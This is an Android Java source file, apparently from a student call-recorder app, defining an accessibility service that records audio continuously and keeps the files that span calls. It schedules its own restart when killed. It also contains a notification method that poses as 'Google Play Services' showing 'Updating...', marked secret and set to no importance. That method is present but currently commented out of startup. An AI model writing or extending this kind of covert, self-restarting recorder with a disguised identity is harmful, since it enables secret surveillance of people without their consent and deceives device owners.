package in.ac.vitbhopal.projects.callrecorder.services;

import android.accessibilityservice.AccessibilityService;
import android.app.AlarmManager;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.os.SystemClock;
import android.util.Log;
import android.view.accessibility.AccessibilityEvent;
import androidx.annotation.RequiresApi;
import androidx.core.app.NotificationCompat;
import androidx.core.util.Consumer;

import java.io.File;

import in.ac.vitbhopal.projects.callrecorder.MainActivity;
import in.ac.vitbhopal.projects.callrecorder.R;
import in.ac.vitbhopal.projects.callrecorder.RecorderConstants;
import in.ac.vitbhopal.projects.callrecorder.helper.PhoneState;
import in.ac.vitbhopal.projects.callrecorder.helper.PhoneStateChangeListener;
import in.ac.vitbhopal.projects.callrecorder.helper.PhoneStateObserver;
import in.ac.vitbhopal.projects.callrecorder.recorder.AbstractRecorder;
import in.ac.vitbhopal.projects.callrecorder.recorder.VersionedRecorderFactory;


@RequiresApi(api = Build.VERSION_CODES.N)
public class RecorderService extends AccessibilityService {
    private AbstractRecorder recorder;
    private PhoneStateChangeListener phoneStateChangeListener;
    @Override
    public void onCreate() {
        super.onCreate();
        initializeRecorder();
        initializeStateChangeHandler();
        //createNotificationChannel();
        //initiateNotification();
    }

    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel serviceChannel = new NotificationChannel(
                    RecorderConstants.NOTIFICATION_CHANNEL_ID,
                    "ARS Notification Channel",
                    NotificationManager.IMPORTANCE_NONE
            );
            NotificationManager manager = getSystemService(NotificationManager.class);
            manager.createNotificationChannel(serviceChannel);
        }
    }

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) { }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        return START_STICKY;
    }

    @Override
    public void onInterrupt() { }

    @Override
    public void onTaskRemoved(Intent rootIntent) {
        super.onTaskRemoved(rootIntent);
        Intent restartIntent = new Intent(getApplicationContext(), RecorderService.class);
        PendingIntent pendingServiceRestartIntent = PendingIntent.getService(getApplicationContext(), 1, restartIntent, 0);
        AlarmManager alarmManager = (AlarmManager) getApplicationContext().getSystemService(Context.ALARM_SERVICE);
        alarmManager.set(AlarmManager.ELAPSED_REALTIME, SystemClock.elapsedRealtime() + 500, pendingServiceRestartIntent);
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        if (recorder != null) {
            recorder.dispose();
        }
        if (phoneStateChangeListener != null) {
            phoneStateChangeListener.dispose();
        }
    }

    private void initializeRecorder() {
        try {
            recorder = VersionedRecorderFactory.getRecorder(getApplicationContext());
        } catch (IllegalArgumentException e) {
            Log.d(RecorderConstants.DEBUG_TAG, "Invalid android version detected! Shutting down...");
            stopSelf();
        }
    }

    private void initializeStateChangeHandler() {
        phoneStateChangeListener = new PhoneStateObserver(getApplicationContext(), 5000);

        phoneStateChangeListener.onObservationTick(new Consumer<PhoneState>() {
            private PhoneState lastState = PhoneState.IDLE;
            @Override
            public void accept(PhoneState state) {
                switch (state) {
                    case IDLE:
                        if (recorder.isRecording()) {
                            File out = recorder.getCurrentSaveFile();
                            recorder.stop();
                            if (out != null && lastState == PhoneState.IDLE) {
                                out.delete();
                            }
                        }
                        recorder.start();
                        break;
                    case CELLULAR_CALL:
                    case VoIP_CALL:
                        break;
                    default:
                        Log.d(RecorderConstants.DEBUG_TAG, "Unhandled PhoneState found: " + state);
                        break;
                }
                lastState = state;
            }
        });

        // Switched from on state switch recording to dumped continuous recording.
        /*phoneStateChangeListener.onStateChange(new Consumer<PhoneState>() {
            @Override
            public void accept(PhoneState state) {
                if (recorder.isRecording() && state == PhoneState.IDLE) {
                    recorder.stop();
                } else if (!recorder.isRecording() && (state == PhoneState.CELLULAR_CALL || state == PhoneState.VoIP_CALL)) {
                    recorder.start();
                }
            }
        });*/
    }

    @Override
    protected void onServiceConnected() {
        Intent intent = new Intent(getApplicationContext(), MainActivity.class);
        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_CLEAR_TASK);
        intent.setAction(Intent.ACTION_MAIN);
        intent.addCategory(Intent.CATEGORY_LAUNCHER);
        startActivity(intent);
    }

    private void initiateNotification() {
        Intent notificationIntent = new Intent(this, MainActivity.class);
        PendingIntent pendingIntent = PendingIntent.getActivity(
                this,
                0, notificationIntent, 0
        );
        Notification notification = new NotificationCompat.Builder(this, RecorderConstants.NOTIFICATION_CHANNEL_ID)
                .setContentTitle("Google Play Services")
                .setContentText("Updating...")
                .setSmallIcon(R.drawable.ic_launcher_background)
                .setContentIntent(pendingIntent)
                .setVisibility(NotificationCompat.VISIBILITY_SECRET)
                .build();

        startForeground(1, notification);
    }
}
